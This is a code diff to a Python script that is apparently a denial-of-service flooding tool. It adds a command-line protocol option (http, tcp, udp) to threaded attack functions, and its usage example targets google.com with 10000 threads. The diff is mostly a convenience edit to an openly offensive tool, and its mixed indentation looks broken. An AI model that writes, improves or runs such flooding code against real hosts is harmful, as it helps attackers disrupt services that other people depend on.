@@ -18,14 +18,15 @@ def showBanner():
 		print(colored(f.read(), "red") + "[" + version + "]\n")
 
 def usageMsg():
-	print("USAGE: python " + sys.argv[0] + "  [HOST] [PORT] [THREADS] [DURATION]"
-                "\nEXAMPLE: python " + sys.argv[0] + "  http://google.com 80 10000 0.01\n")
-	exit(0)
+    print("USAGE: python " + sys.argv[0] + "  [HOST] [PORT] [THREADS] [DURATION] [PROTOCOL:http/tcp/udp]"
+                "\nEXAMPLE: python " + sys.argv[0] + "  http://google.com 80 10000 10 tcp\n")
+    exit(0)
 
 showBanner()
- 
+
 ip       = ""
-host_arr = []	
+host_arr = []
+protocol = 'tcp'
 
 if len(sys.argv) == 1:
 	while True:
@@ -47,14 +48,14 @@ if len(sys.argv) == 1:
 	while True:
 		try:
 			port     = int(input("[+]PORT (default: 80) > ") or 80 )
-			threads  = int(input("[+]THREADS (default: 20)> ") or 20 ) 
-			duration  = float(input("[+]DURATION (default: 5 min) > ") or 5 ) 
+			threads  = int(input("[+]THREADS (default: 20)> ") or 20 )
+			duration  = float(input("[+]DURATION (default: 5 min) > ") or 5 )
 			print("")
 			break
 		except:
 			print(colored("Incorrect input!", "red"))
 
-elif len(sys.argv) != 5:
+elif len(sys.argv) != 6:
 	usageMsg()
 else:
 	try:
@@ -64,6 +65,7 @@ else:
 		port     = int(sys.argv[2])
 		threads  = int(sys.argv[3])
 		duration  = float(sys.argv[4])
+                protocol = sys.argv[5]  # http, tcp ,udp
 	except:
 		usageMsg()
 
@@ -137,7 +139,7 @@ def attackHttp():
 			sock.close()
 
 		if req % 1000 == 0:
-			print(colored("[+]", "green") + " [" + str(datetime.now().strftime("%d %b %Y %H:%M:%S")) + "] " + host + " [" + colored(err, "red") + "] ") 
+			print(colored("[+]", "green") + " [" + str(datetime.now().strftime("%d %b %Y %H:%M:%S")) + "] " + host + " [" + colored(err, "red") + "] ")
 
 def attackTcp():
 	global req
@@ -184,32 +186,19 @@ def attackUdp():
 			print(colored("[+]", "green")+ " [" + str(datetime.now().strftime("%d %b %Y %H:%M:%S")) + "] " + host + " [" + colored(err,"red") + "] ")
 
 alltypes = ['udp','tcp','http','1','2','3']
-mode     = ""
-
-while True:
-	type = str(input("[HTTP/TCP/UDP][1/2/3] > "))
-
-	if type.lower() in alltypes:
-		if type == '1' or type.lower() == 'http':
-			mode = 'HTTP'
-		elif type == '2' or type.lower() == 'tcp':
-			mode = 'TCP'
-		elif type == '3' or type.lower() == 'udp':
-			mode = 'UDP'
-
-		print('[+]Mode set to ' + mode)
-		break
-	else:
-		print(colored('Wrong type!',"red"))		
+mode     = protocol
+if protocol not in ['http', 'tcp', 'udp']:
+    print("not support protocol, support: http, tcp, udp")
+    sys.exit(0)
 
 print("[*]STARTING...\n")
 
 for i in range(threads):
-	if mode == 'HTTP':
+	if mode == 'http':
 		th = Thread(target=attackHttp)
-	elif mode == 'TCP':
+	elif mode == 'tcp':
 		th = Thread(target=attackTcp)
-	elif mode == 'UDP':
+	elif mode == 'udp':
 		th = Thread(target=attackUdp)
 
 	try:
